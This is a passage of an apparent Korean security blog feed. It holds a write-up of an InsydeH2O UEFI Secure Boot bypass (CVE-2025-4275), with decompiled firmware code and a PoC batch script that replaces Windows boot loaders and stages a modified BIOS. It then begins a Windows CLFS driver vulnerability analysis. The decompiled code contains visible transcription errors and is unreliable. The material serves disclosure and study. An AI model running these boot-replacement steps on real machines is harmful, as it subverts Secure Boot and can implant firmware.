class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> (v0 &gt;= NoHandles )<span class="hljs-keyword">return</span> EFI_NOT_FOUND;v1 = gRT-&gt;SetVariable((CHAR16 *)<span class="hljs-string">L&quot;SecureFlashCertData&quot;</span>, &amp;SECURE_FLASH_INFO_GUID,VARIABLE_ATTRIBUTE_BS_RT,DataSize,Data);gBS-&gt;FreePool(Data);<span class="hljs-keyword">if</span> (v1 &gt;= <span class="hljs-number">0</span>){v6 = <span class="hljs-number">0</span>;<span class="hljs-keyword">return</span> gRT-&gt;SetVariable((CHAR16 *) <span class="hljs-string">L&quot;SecureFlashSetupMode&quot;</span>, &amp;SECURE_FLASH_INFO_GUID, <span class="hljs-number">6u</span>, <span class="hljs-number">1u</span>, &amp;v6);}<span class="hljs-keyword">return</span> v1;}}<span class="hljs-keyword">return</span> EFI_NOT_FOUND;}</code></pre><p><code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0;&#xC11C;&#xB294; NVRAM &#xBCC0;&#xC218;&#xC778; <code>SecureFlashSetupMode</code>&#xC640; EFI_SIGNATURE_LIST &#xD615;&#xC2DD;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xAC00; &#xD3EC;&#xD568;&#xB41C; <code>SecureFlashCertData</code>&#xC758; &#xB450; &#xAC1C;&#xC758; &#xBCC0;&#xC218;&#xB97C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">char_fastcall <span class="hljs-title">VerifyBySecureFlashSignature</span><span class="hljs-params">( _int64 a1, _int64 a2)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// si</span>_int64 Variable; <span class="hljs-comment">// rax</span><span class="hljs-keyword">char</span> *v7; <span class="hljs-comment">// rbx</span>_int64 v8; <span class="hljs-comment">// rdi</span>UINTN v9; <span class="hljs-comment">// &#x433;8</span><span class="hljs-keyword">void</span> *v10; <span class="hljs-comment">// rcx</span>UINT8 Sha256Hash; <span class="hljs-comment">// rdx</span><span class="hljs-keyword">void</span> *CryptoServices Protocol; <span class="hljs-comment">// [rsp+30h] [rbp-10h] BYREF</span>unsigned_int64 v13; <span class="hljs-comment">// [rsp+38h] [rbp-8h] BYREF</span><span class="hljs-keyword">void</span> *v14; <span class="hljs-comment">// [rsp+80h] [rbp+40h] BYREF</span><span class="hljs-keyword">void</span> *Buffer; <span class="hljs-comment">// [rsp+88h] [rbp+48h] BYREF</span><span class="hljs-keyword">if</span> ((gBS-&gt;LocateProtocol(&amp;CRYPTO_SERVICES_PROTOCOL_GUID, <span class="hljs-number">0</span>, &amp;CryptoServices Protocol) &amp; <span class="hljs-number">0x8000000000000000</span>uLL) != &#xD8;LL)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;Buffer = <span class="hljs-number">0</span>;v14 = <span class="hljs-number">0</span>;v5 = <span class="hljs-number">0</span>;LibGetVariable(aSecureFlashSetupMode, &amp;SECURE_FLASH_INFO_GUID, &amp;v13, &amp;v14);<span class="hljs-keyword">if</span> (v14){<span class="hljs-function">Variable <span class="hljs-title">LibGetVariable</span><span class="hljs-params">(aSecureFlashCertData, &amp;SECURE_FLASH_INFO_GUID, &amp;v13, &amp;Buffer)</span></span>;v7= (<span class="hljs-keyword">char</span> *)Buffer;<span class="hljs-keyword">if</span> (Variable &gt;= <span class="hljs-number">0</span>){v8 = <span class="hljs-number">0</span>;<span class="hljs-keyword">if</span> (v13 &gt; <span class="hljs-number">0x10</span>){v9 HashSize;v10: Buffer;<span class="hljs-keyword">do</span>{<span class="hljs-keyword">if</span> (*(_DWORD *)&amp;v7 [v8 + <span class="hljs-number">16</span>] &lt; <span class="hljs-number">0x1C</span>u)<span class="hljs-keyword">break</span>;v5 = (((_int64 (_fastcall **) (_int64, _int64, <span class="hljs-keyword">char</span> *, _int64, _QWORD, UINTN)) CryptoServicesProtocol + <span class="hljs-number">0x22</span>)) (al,a2,&amp;v7 [v8 + <span class="hljs-number">44</span>], *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *) &amp;v7 [v8 + <span class="hljs-number">24</span>] <span class="hljs-number">16L</span>L,*(_QWORD *)v10, ); <span class="hljs-comment">// AuthenticodeVerify</span><span class="hljs-keyword">if</span> (v5)<span class="hljs-keyword">break</span>;v10 = Buffer;v9 = HashSize;Sha256Hash = (UINT8 *):: Buffer [<span class="hljs-number">1</span>].Sha256Hash;<span class="hljs-keyword">if</span> (HashSize &amp;&amp; (UINT8 *):: Buffer-&gt;Sha256Hash != Sha256Hash ){<span class="hljs-keyword">if</span> (sub_350((UINT8 *):: Buffer-&gt;Sha256Hash, Sha256Hash, HashSize)){v5 = (*((_int64 (_fastcall **) (_int64, _int64, <span class="hljs-keyword">char</span> *, _int64, EFI_HASH_OUTPUT, UINTN)) CryptoServicesProtocol+ <span class="hljs-number">0x22</span>)) ( al, a2, &amp;v7 [v8 + <span class="hljs-number">44</span>], *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;v7 [v8 + <span class="hljs-number">24</span>] <span class="hljs-number">16L</span>L, :: Buffer [<span class="hljs-number">1</span>], HashSize);  <span class="hljs-comment">// AuthenticodeVerify</span><span class="hljs-keyword">if</span> (v5)<span class="hljs-keyword">break</span>;}v9 = HashSize;v10 = Buffer;}v8 += (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)&amp;v7 [v8 +<span class="hljs-number">16</span>];}<span class="hljs-keyword">while</span> (v8+ <span class="hljs-number">28</span> &lt; v13);}}<span class="hljs-keyword">if</span> (v7)gBS-&gt;FreePool(v7);gBS-&gt;FreePool(v14);}<span class="hljs-keyword">return</span> v5;}</code></pre><p><code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB294; <code>SecureFlashSetupMode</code>&#xC640; <code>SecureFlashCertData</code> &#xB450; &#xBCC0;&#xC218; &#xAC12;&#xC774; &#xBAA8;&#xB450; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC77D;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; <code>SecureFlashSetupMode</code>&#xC640; <code>SecureFlashCertData</code> &#xC774; &#xB450; NVRAM &#xBCC0;&#xC218;&#xB294; &#xBCF4;&#xD638;&#xB418;&#xC9C0; &#xC54A;&#xAE30;&#xC5D0; &#xB7F0;&#xD0C0;&#xC784; &#xC911;&#xC5D0; &#xBCC0;&#xC870;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCC0;&#xC870;&#xD55C; &#xB450; &#xBCC0;&#xC218;&#xB97C; <code>SecurityStubDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xBA74;, <code>BdsDxe</code> &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xAC00; &#xC0DD;&#xC131;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC18D;&#xC77C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4;&#xC5D0; &#xC624;&#xB294; &#xBAA8;&#xB4E0; &#xD56D;&#xBAA9;&#xC740; &#xCD94;&#xAC00;&#xC801;&#xC778; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xBAA8;&#xB450; &#xC2E0;&#xB8B0;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, <code>isflash.bin</code>&#xC758; Secure Boot &#xACFC;&#xC815; &#xBC0F; Insyde &#xC11C;&#xBA85; &#xD655;&#xC778;&#xC744; &#xBAA8;&#xB450; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC&#xC758; &#xC77C;&#xBD80;&#xC778; <code>sfpoc.cmd</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">sfcd <span class="hljs-built_in">set</span>mountvol U: /smkdir U:\\EFI\\Insyde<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\\Insyde\\<span class="hljs-built_in">move</span> U:\\EFI\Boot\\bootx64.efi U:\\EFI\\Boot\\bootx64.efi.org<span class="hljs-built_in">move</span> U:\\EFI\Microsoft\\Boot\\bootmgfw.efi U:\\EFI\Microsoft\\Boot\\bootmgfw.efi.org<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\Boot\\bootx64.efi<span class="hljs-built_in">copy</span> isflash.bin U:\\EFI\Microsoft\\Boot\\bootmgfw.efi<span class="hljs-built_in">copy</span> bios.bin U:\\<span class="hljs-built_in">copy</span> fpt_signed.efi U:\\<span class="hljs-built_in">copy</span> sfpoc_signed.efi U:\\<span class="hljs-built_in">copy</span> startup_2.nsh U:\\<span class="hljs-built_in">copy</span> startup_1.nsh U:\\startup.nsh<span class="hljs-built_in">dir</span> U:pausemountvol U: /dshutdown /<span class="hljs-built_in">r</span> /t <span class="hljs-number">0</span></code></pre><p>&#xBCC0;&#xC870;&#xD55C; &#xAC01; <code>.efi</code> &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBAA8;&#xB450; &#xBE4C;&#xB4DC;&#xD558;&#xACE0; &#xC11C;&#xBA85;&#xD55C; &#xC774;&#xD6C4;&#xC5D0; Windows&#xC5D0;&#xC11C; &#xAD00;&#xB9AC;&#xC790; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC704; <code>sfpoc.cmd</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;, &#xC7AC;&#xBD80;&#xD305; &#xC774;&#xD6C4;&#xC5D0; &#xC218;&#xC815;&#xB41C; BIOS &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xCC98;&#xB7FC; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xC774; &#xBCC0;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC790;&#xC2E0;&#xC758; &#xC778;&#xC99D;&#xC11C;&#xB97C; &#xC800;&#xC7A5;&#xD55C; &#xD6C4;, UEFI &#xD658;&#xACBD;&#xC758; &#xCD08;&#xAE30; &#xBD80;&#xD305; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC0BD;&#xC785;&#xB41C; &#xC778;&#xC99D;&#xC11C;&#xB85C; &#xC11C;&#xBA85;&#xB41C; &#xC784;&#xC758;&#xC758; <code>.efi</code> &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC544;&#xB798; &#xC601;&#xC0C1;&#xC73C;&#xB85C; PoC &#xC2DC;&#xC5F0;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/1uJF44S0LQw?si=0jSHTtroxe_RMXCo" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; Insyde&#xC5D0; &#xBCF4;&#xACE0;&#xB418;&#xC5C8;&#xC73C;&#xBA70;, &#xACF5;&#xAC1C; &#xD6C4; 90&#xC77C; &#xB9CC;&#xC5D0; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-4275">https://nvd.nist.gov/vuln/detail/CVE-2025-4275</a></li><li><a href="https://coderush.me/hydroph0bia-part1/">https://coderush.me/hydroph0bia-part1/</a></li><li><a href="https://coderush.me/hydroph0bia-part2/">https://coderush.me/hydroph0bia-part2/</a></li><li><a href="https://github.com/NikolajSchlej/Hydroph0bia/tree/main/sfpoc">https://github.com/NikolajSchlej/Hydroph0bia/tree/main/sfpoc</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Insyde-Software/">Insyde Software</category>
      
      <category domain="https://hackyboiz.github.io/tags/InsydeH2O/">InsydeH2O</category>
      
      <category domain="https://hackyboiz.github.io/tags/UEFI-firmware/">UEFI firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/Secure-Boot-bypass/">Secure Boot bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/06/25/newp1ayer48/CVE-2025-4275/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-49138: Windows Common Log File System Driver Elevation of Privilege 취약점</title>
      <link>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/</link>
      <guid>https://hackyboiz.github.io/2025/06/18/ogu123/cve-2024-49138/</guid>
      <pubDate>Wed, 18 Jun 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://security.humanativaspa.it/cve-2024-49138-wi</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://security.humanativaspa.it/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/">https://security.humanativaspa.it/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>KB5048685 &#xC774;&#xC804; &#xBC84;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows CLFS (Common Log File System)&#xB294; &#xB85C;&#xAE45; &#xB610;&#xB294; &#xBCF5;&#xAD6C; &#xC9C0;&#xC6D0;&#xC774; &#xD544;&#xC694;&#xD55C; &#xBAA8;&#xB4E0; &#xC0AC;&#xC6A9;&#xC790; &#xBAA8;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; CLFS&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CVE-2024-49138 &#xCDE8;&#xC57D;&#xC810;&#xC740; BLF(Base Log File)&#xC758; GENERAL &#xBE14;&#xB85D;&#xC774; free &#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC9C0; &#xC54A;&#xC544;, GENERAL &#xBE14;&#xB85D; &#xB0B4;&#xBD80; &#xCEE4;&#xB110; &#xAC1D;&#xCCB4; &#xD3EC;&#xC778;&#xD130;(<code>containerContext-&gt;pContainer</code>)&#xB97C; &#xC870;&#xC791;&#xD574;&#xC11C; EoP &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Layout-of-a-BLF-file"><a href="#Layout-of-a-BLF-file" class="headerlink" title="Layout of a BLF file"></a>Layout of a BLF file</h3><p><img src="/2025/06/18/ogu123/cve-2024-49138/image1.png" alt></p><p>&#xBA3C;&#xC800; BLF &#xD30C;&#xC77C;&#xC740; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC640; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xB294; &#xB370; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xB85C; &#xC5EC;&#xAE30;&#xC11C; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xB294; BLF&#xC640; &#xC5F0;&#xACB0;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xB370;&#xC774;&#xD130; &#xD30C;&#xC77C;&#xC785;&#xB2C8;&#xB2E4;. <code>CreateLogFile()</code>&#xC640; <code>AddLogContainer()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xACE0; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>BLF &#xD30C;&#xC77C;&#xC740; &#xADF8;&#xB9BC;&#xACFC; &#xAC19;&#xC774; 6&#xAC1C; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xBA70; &#xCDE8;&#xC57D;&#xC810;&#xC774; GENERAL &#xBE14;&#xB85D;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xC640; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC5B4; GENERAL &#xBE14;&#xB85D;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_LOG_BLOCK_HEADER</span></span><span class="hljs-class">{</span>    UCHAR MajorVersion;    UCHAR MinorVersion;    UCHAR Usn;    CLFS_CLIENT_ID ClientId;    USHORT TotalSectorCount;    USHORT ValidSectorCount;    ULONG Padding;    ULONG Checksum;    ULONG Flags;    CLFS_LSN CurrentLsn;    CLFS_LSN NextLsn;    ULONG RecordOffsets[<span class="hljs-number">16</span>];    ULONG SignaturesOffset;} CLFS_LOG_BLOCK_HEADER, *PCLFS_LOG_BLOCK_HEADER;</code></pre><p>GENERAL &#xBE14;&#xB85D;&#xC740; &#xB2E4;&#xB978; &#xBAA8;&#xB4E0; &#xBE14;&#xB85D;&#xACFC; &#xAC19;&#xC774; <code>CLFS_LOG_BLOCK_HEADER</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xACE0;, &#xC774;&#xC5B4;&#xC11C; <code>BASE_RECORD_HEADER</code>&#xAC00; &#xB098;&#xC635;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_BASE_RECORD_HEADER</span></span><span class="hljs-class">{</span>    CLFS_METADATA_RECORD_HEADER hdrBaseRecord;    CLFS_LOG_ID cidLog;    ULONGLONG rgClientSymTbl[CLIENT_SYMTBL_SIZE];    ULONGLONG rgContainerSymTbl[CONTAINER_SYMTBL_SIZE];    ULONGLONG rgSecuritySymTbl[SHARED_SECURITY_SYMTBL_SIZE];    ULONG cNextContainer;    CLFS_CLIENT_ID cNextClient;    ULONG cFreeContainers;    ULONG cActiveContainers;    ULONG cbFreeContainers;    ULONG cbBusyContainers;    ULONG rgClients[MAX_CLIENTS_DEFAULT];    ULONG rgContainers[MAX_CONTAINERS_DEFAULT];  &lt;- here!    ULONG cbSymbolZone;    ULONG cbSector;    USHORT bUnused;    CLFS_LOG_STATE eLogState;    UCHAR cUsn;    UCHAR cClients;} CLFS_BASE_RECORD_HEADER, *PCLFS_BASE_RECORD_HEADER;</code></pre><p>&#xC5EC;&#xAE30;&#xC11C; <code>rgContainers</code> &#xD544;&#xB4DC;&#xB294; <code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0; &#xB300;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xC800;&#xC7A5;&#xD55C; &#xBC30;&#xC5F4;&#xC774;&#xBA70; <code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xB294; &#xAC01; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC5D0; &#xB300;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_CONTAINER_CONTEXT</span></span><span class="hljs-class">{</span>    CLFS_NODE_ID cidNode;    ULONGLONG cbContainer;    CLFS_CONTAINER_ID cidContainer;    CLFS_CONTAINER_ID cidQueue;    <span class="hljs-keyword">union</span>    {        CClfsContainer* pContainer; &lt;-here        ULONGLONG ullAlignment;    };    CLFS_USN usnCurrent;    CLFS_CONTAINER_STATE eState;    ULONG cbPrevOffset;    ULONG cbNextOffset;} CLFS_CONTAINER_CONTEXT, *PCLFS_CONTAINER_CONTEXT;</code></pre><p><code>CLFS_CONTAINER_CONTEXT</code> &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C;&#xB294; <code>pContainer</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; &#xC911;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. &#xB514;&#xC2A4;&#xD06C;&#xC5D0;&#xC11C;&#xB294; 0&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC9C0;&#xB9CC;, BLF&#xAC00; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xB418;&#xBA74; <code>CClfsContainer</code> &#xAC1D;&#xCCB4;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xCEE4;&#xB110; &#xD3EC;&#xC778;&#xD130;&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">unaligned</span> __<span class="hljs-title">declspec</span>(<span class="hljs-title">align</span>(8)) _<span class="hljs-title">CClfsBaseFilePersisted</span></span><span class="hljs-class">{</span>  _CClfsBaseFilePersisted_VTABLE_0_00000001C0014000::vtable *vftbl_0_00000001C0014000;  ULONG m_cref;  _BYTE gapC[<span class="hljs-number">4</span>];  PUCHAR m_pbImage;  ULONG m_cbImage;  _BYTE gap1C[<span class="hljs-number">4</span>];  __int64 m_presImage;  USHORT m_cBlocks;  _BYTE gap2A[<span class="hljs-number">6</span>];  CLFS_METADATA_BLOCK *m_rgBlocks;    &lt;- here!  PUSHORT m_rgcBlockReferences;       &lt;- here!  CLFSHASHTBL m_symtblClient;  CLFSHASHTBL m_symtblContainer;  CLFSHASHTBL m_symtblSecurity;  ULONGLONG size;  ULONG m_cbRawSectorSize;  BOOLEAN m_fgeneralBlockReferenced;  __declspec(align(<span class="hljs-number">4</span>)) __int64 pCclfsContainer;  __int64 event_a0;  __int64 field_A8;  <span class="hljs-keyword">char</span> file_ea_info[<span class="hljs-number">16</span>];  __int64 field_C0;  <span class="hljs-keyword">int</span> field_C8;  _BYTE gapCC[<span class="hljs-number">4</span>];  __int64 field_D0;  _UNICODE_STRING filepath;  RTL_BITMAP bitmap;  <span class="hljs-keyword">char</span> bitmapBuf[<span class="hljs-number">128</span>];  <span class="hljs-keyword">int</span> field_178;  _BYTE gap17C[<span class="hljs-number">4</span>];  <span class="hljs-keyword">char</span> field_180[<span class="hljs-number">16</span>];  <span class="hljs-keyword">char</span> field_190[<span class="hljs-number">16</span>];  <span class="hljs-keyword">char</span> n_writes[<span class="hljs-number">16</span>];  __int64 field_1B0;  __int64 controlrecord;  <span class="hljs-keyword">int</span> field_1C0;};</code></pre><p><code>CreateLogFile()</code> API&#xB97C; &#xD1B5;&#xD574; BLF &#xD30C;&#xC77C;&#xC744; &#xC5F4;&#xBA74; clfs.sys&#xB294; CClfsBaseFilePersisted &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xC788;&#xB294; BLF &#xD30C;&#xC77C;&#xC744; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><p>CClfsBaseFilePersisted &#xD074;&#xB798;&#xC2A4;&#xC5D0;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xD544;&#xB4DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><code>m_rgBlocks</code> : CLFS_METADATA_BLOCK &#xAD6C;&#xC870;&#xCCB4; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xB85C; &#xBC30;&#xC5F4; &#xAC12;&#xC73C;&#xB85C; CONTROL, GENERAL &#xB4F1; &#xBE14;&#xB85D;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>m_rgcBlockReferences</code> : &#xAC01; &#xBE14;&#xB85D;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870; &#xCE74;&#xC6B4;&#xD2B8;(reference count)&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xBC30;&#xC5F4;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C;, &#xBC30;&#xC5F4; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xBE14;&#xB85D;&#xC774; &#xD604;&#xC7AC; &#xBA87; &#xAD70;&#xB370;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CLFS_METADATA_BLOCK</span></span><span class="hljs-class">{</span>  PUCHAR pbImage;  ULONG cbImage;  ULONG cbOffset;  CLFS_METADATA_BLOCK_TYPE eBlockType;};</code></pre><p>CLFS_METADATA_BLOCK &#xAD6C;&#xC870;&#xCCB4;&#xC5D0;&#xC11C; <code>pbImage</code> &#xD544;&#xB4DC;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xBE14;&#xB85D;&#xC758; &#xC2DC;&#xC791; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD3EC;&#xC778;&#xD130;&#xC774;&#xACE0; <code>eBlockType</code>&#xB294; &#xBA54;&#xD0C0;&#xB370;&#xC774;&#xD130; &#xBE14;&#xB85D;&#xC758; &#xC885;&#xB958;&#xB97C; &#xB098;&#xD0C0;&#xB0C5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE{    ClfsMetaBlockControl,    ClfsMetaBlockControlShadow,    ClfsMetaBlockGeneral,      &lt;- here    ClfsMetaBlockGeneralShadow,    ClfsMetaBlockScratch,    ClfsMetaBlockScratchShadow} CLFS_METADATA_BLOCK_TYPE, *PCLFS_METADATA_BLOCK_TYPE;</code></pre><p>_CLFS_METADATA_BLOCK_TYPE&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, GENERAL &#xBE14;&#xB85D;&#xC758; <code>eBlockType</code>&#xC740; <code>ClfsMetaBlockGeneral</code>&#xC774;&#xBA70;, &#xC774; &#xAC12;&#xC740; 2&#xC5D0; &#xD574;&#xB2F9;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">CClfsBaseFile::AcquireMetadataBlock</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        _CClfsBaseFilePersisted *<span class="hljs-keyword">this</span>,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">enum</span> _CLFS_METADATA_BLOCK_TYPE blockType)</span></span><span class="hljs-function"></span>{  __int64 BlockType; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// r8d</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// r9d</span>  BlockType = blockType;  v4 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)BlockType &lt; <span class="hljs-number">0</span> || (<span 